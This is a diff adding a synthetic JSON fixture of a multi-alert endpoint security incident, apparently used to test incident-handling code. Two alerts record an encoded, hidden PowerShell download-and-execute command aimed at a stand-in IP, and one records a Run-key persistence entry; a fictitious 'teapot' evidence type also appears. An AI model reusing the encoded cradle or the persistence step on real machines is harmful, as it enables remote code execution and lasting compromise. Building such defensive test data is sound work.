@@ -1,0 +1,388 @@
+{
+ "id": "14",
+ "displayName": "Multi-stage incident on multiple endpoints",
+ "status": "active",
+ "severity": "high",
+ "redirectIncidentId": null,
+ "createdDateTime": "2026-09-10T10:01:00Z",
+ "lastUpdateDateTime": "2026-09-10T10:06:00Z",
+ "alerts": [
+  {
+   "id": "da-1",
+   "incidentId": "14",
+   "title": "Suspicious PowerShell command line",
+   "severity": "high",
+   "status": "new",
+   "category": "Execution",
+   "serviceSource": "microsoftDefenderForEndpoint",
+   "detectionSource": "microsoftDefenderForEndpoint",
+   "detectorId": "det-1",
+   "createdDateTime": "2026-09-10T10:01:00Z",
+   "firstActivityDateTime": "2026-09-10T10:00:00Z",
+   "lastActivityDateTime": "2026-09-10T10:05:00Z",
+   "mitreTechniques": [
+    "T1059.001"
+   ],
+   "evidence": [
+    {
+     "@odata.type": "#microsoft.graph.security.deviceEvidence",
+     "createdDateTime": "2026-09-10T10:00:01.1234567Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "deviceDnsName": "ws01.lab.example",
+     "mdeDeviceId": "mde-ws01",
+     "osPlatform": "Windows11",
+     "riskScore": "high",
+     "loggedOnUsers": [
+      {
+       "accountName": "alice",
+       "domainName": "LAB"
+      }
+     ]
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.userEvidence",
+     "createdDateTime": "2026-09-10T10:00:01Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [
+      "compromised"
+     ],
+     "detailedRoles": [],
+     "userAccount": {
+      "accountName": "alice",
+      "domainName": "LAB",
+      "userSid": "S-1-5-21-1-2-3-1104",
+      "azureAdUserId": "aad-alice",
+      "userPrincipalName": "alice@lab.example",
+      "displayName": "Alice"
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.processEvidence",
+     "createdDateTime": "2026-09-10T10:00:02Z",
+     "verdict": "malicious",
+     "remediationStatus": "active",
+     "roles": [],
+     "detailedRoles": [
+      "attacker tool"
+     ],
+     "processId": 4312,
+     "parentProcessId": 2200,
+     "processCommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=",
+     "processCreationDateTime": "2026-09-10T10:00:00.5000000Z",
+     "parentProcessCreationDateTime": "2026-09-10T09:59:00Z",
+     "mdeDeviceId": "mde-ws01",
+     "detectionStatus": "detected",
+     "imageFile": {
+      "fileName": "powershell.exe",
+      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+      "sha1": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "fileSize": 450560
+     },
+     "parentProcessImageFile": {
+      "fileName": "winword.exe",
+      "filePath": "C:\\Program Files\\Microsoft Office",
+      "sha1": "cccccccccccccccccccccccccccccccccccccccc",
+      "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+     },
+     "userAccount": {
+      "accountName": "alice",
+      "domainName": "LAB",
+      "userSid": "S-1-5-21-1-2-3-1104",
+      "azureAdUserId": "aad-alice",
+      "userPrincipalName": "alice@lab.example",
+      "displayName": "Alice"
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.ipEvidence",
+     "createdDateTime": "2026-09-10T10:00:04Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [
+      "destination"
+     ],
+     "detailedRoles": [],
+     "ipAddress": "203.0.113.7",
+     "countryLetterCode": "NL"
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.urlEvidence",
+     "createdDateTime": "2026-09-10T10:00:04Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "url": "http://203.0.113.7/a.ps1"
+    }
+   ]
+  },
+  {
+   "id": "da-2",
+   "incidentId": "14",
+   "title": "Suspicious file dropped",
+   "severity": "high",
+   "status": "new",
+   "category": "Execution",
+   "serviceSource": "microsoftDefenderForEndpoint",
+   "detectionSource": "microsoftDefenderForEndpoint",
+   "detectorId": "det-2",
+   "createdDateTime": "2026-09-10T10:02:00Z",
+   "firstActivityDateTime": "2026-09-10T10:00:00Z",
+   "lastActivityDateTime": "2026-09-10T10:05:00Z",
+   "mitreTechniques": [
+    "T1059.001"
+   ],
+   "evidence": [
+    {
+     "@odata.type": "#microsoft.graph.security.deviceEvidence",
+     "createdDateTime": "2026-09-10T10:00:01.1234567Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "deviceDnsName": "ws01.lab.example",
+     "mdeDeviceId": "mde-ws01",
+     "osPlatform": "Windows11",
+     "riskScore": "high",
+     "loggedOnUsers": [
+      {
+       "accountName": "alice",
+       "domainName": "LAB"
+      }
+     ]
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.userEvidence",
+     "createdDateTime": "2026-09-10T10:00:01Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [
+      "compromised"
+     ],
+     "detailedRoles": [],
+     "userAccount": {
+      "accountName": "alice",
+      "domainName": "LAB",
+      "userSid": "S-1-5-21-1-2-3-1104",
+      "azureAdUserId": "aad-alice",
+      "userPrincipalName": "alice@lab.example",
+      "displayName": "Alice"
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.processEvidence",
+     "createdDateTime": "2026-09-10T10:00:02Z",
+     "verdict": "malicious",
+     "remediationStatus": "active",
+     "roles": [],
+     "detailedRoles": [
+      "attacker tool"
+     ],
+     "processId": 4312,
+     "parentProcessId": 2200,
+     "processCommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA3AC8AYQAuAHAAcwAxACcAKQA=",
+     "processCreationDateTime": "2026-09-10T10:00:00.5000000Z",
+     "parentProcessCreationDateTime": "2026-09-10T09:59:00Z",
+     "mdeDeviceId": "mde-ws01",
+     "detectionStatus": "detected",
+     "imageFile": {
+      "fileName": "powershell.exe",
+      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+      "sha1": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "fileSize": 450560
+     },
+     "parentProcessImageFile": {
+      "fileName": "winword.exe",
+      "filePath": "C:\\Program Files\\Microsoft Office",
+      "sha1": "cccccccccccccccccccccccccccccccccccccccc",
+      "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+     },
+     "userAccount": {
+      "accountName": "alice",
+      "domainName": "LAB",
+      "userSid": "S-1-5-21-1-2-3-1104",
+      "azureAdUserId": "aad-alice",
+      "userPrincipalName": "alice@lab.example",
+      "displayName": "Alice"
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.fileEvidence",
+     "createdDateTime": "2026-09-10T10:00:03Z",
+     "verdict": "malicious",
+     "remediationStatus": "prevented",
+     "roles": [],
+     "detailedRoles": [
+      "dropped"
+     ],
+     "mdeDeviceId": "mde-ws01",
+     "detectionStatus": "prevented",
+     "fileDetails": {
+      "fileName": "upd.exe",
+      "filePath": "C:\\Users\\alice\\AppData\\Local\\Temp",
+      "sha1": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+      "sha256": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+      "fileSize": 1024
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.registryValueEvidence",
+     "createdDateTime": "2026-09-10T10:00:05Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [
+      "persistence"
+     ],
+     "registryHive": "HKEY_CURRENT_USER",
+     "registryKey": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "registryValueName": "Updater",
+     "registryValue": "C:\\Users\\alice\\AppData\\Local\\Temp\\upd.exe",
+     "registryValueType": "String",
+     "mdeDeviceId": "mde-ws01"
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.registryKeyEvidence",
+     "createdDateTime": "2026-09-10T10:00:05Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "registryHive": "HKEY_CURRENT_USER",
+     "registryKey": "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    }
+   ]
+  },
+  {
+   "id": "da-3",
+   "incidentId": "14",
+   "title": "Suspicious PowerShell command line",
+   "severity": "medium",
+   "status": "new",
+   "category": "Execution",
+   "serviceSource": "microsoftDefenderForEndpoint",
+   "detectionSource": "microsoftDefenderForEndpoint",
+   "detectorId": "det-3",
+   "createdDateTime": "2026-09-10T10:03:00Z",
+   "firstActivityDateTime": "2026-09-10T10:00:00Z",
+   "lastActivityDateTime": "2026-09-10T10:05:00Z",
+   "mitreTechniques": [
+    "T1059.001"
+   ],
+   "evidence": [
+    {
+     "@odata.type": "#microsoft.graph.security.deviceEvidence",
+     "createdDateTime": "2026-09-10T10:00:01.1234567Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "deviceDnsName": "ws02.lab.example",
+     "mdeDeviceId": "mde-ws02",
+     "osPlatform": "Windows11",
+     "riskScore": "high",
+     "loggedOnUsers": [
+      {
+       "accountName": "alice",
+       "domainName": "LAB"
+      }
+     ]
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.processEvidence",
+     "createdDateTime": "2026-09-10T10:00:02Z",
+     "verdict": "malicious",
+     "remediationStatus": "active",
+     "roles": [],
+     "detailedRoles": [],
+     "processId": 4312,
+     "parentProcessId": 880,
+     "processCommandLine": "powershell.exe -File C:\\tools\\inventory.ps1",
+     "processCreationDateTime": "2026-09-10T10:03:00Z",
+     "parentProcessCreationDateTime": "2026-09-10T09:59:00Z",
+     "mdeDeviceId": "mde-ws02",
+     "detectionStatus": "detected",
+     "imageFile": {
+      "fileName": "powershell.exe",
+      "filePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+      "sha1": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+      "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "fileSize": 450560
+     },
+     "parentProcessImageFile": {
+      "fileName": "winword.exe",
+      "filePath": "C:\\Program Files\\Microsoft Office",
+      "sha1": "cccccccccccccccccccccccccccccccccccccccc",
+      "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
+     },
+     "userAccount": {
+      "accountName": "alice",
+      "domainName": "LAB",
+      "userSid": "S-1-5-21-1-2-3-1104",
+      "azureAdUserId": "aad-alice",
+      "userPrincipalName": "alice@lab.example",
+      "displayName": "Alice"
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.fileEvidence",
+     "createdDateTime": "2026-09-10T10:00:03Z",
+     "verdict": "malicious",
+     "remediationStatus": "prevented",
+     "roles": [],
+     "detailedRoles": [
+      "dropped"
+     ],
+     "mdeDeviceId": "mde-ws02",
+     "detectionStatus": "prevented",
+     "fileDetails": {
+      "fileName": "upd.exe",
+      "filePath": "C:\\Users\\alice\\AppData\\Local\\Temp",
+      "sha1": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+      "sha256": "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+      "fileSize": 1024
+     }
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.ipEvidence",
+     "createdDateTime": "2026-09-10T10:00:04Z",
+     "verdict": "suspicious",
+     "remediationStatus": "none",
+     "roles": [
+      "destination"
+     ],
+     "detailedRoles": [],
+     "ipAddress": "203.0.113.7",
+     "countryLetterCode": "NL"
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.mailboxEvidence",
+     "createdDateTime": "2026-09-10T10:00:06Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "primaryAddress": "alice@lab.example",
+     "displayName": "Alice",
+     "upn": "alice@lab.example"
+    },
+    {
+     "@odata.type": "#microsoft.graph.security.quantumTeapotEvidence",
+     "createdDateTime": "2026-09-10T10:00:07Z",
+     "verdict": "unknown",
+     "remediationStatus": "none",
+     "roles": [],
+     "detailedRoles": [],
+     "displayName": "teapot-1",
+     "teapotId": "42"
+    }
+   ]
+  }
+ ]
+}
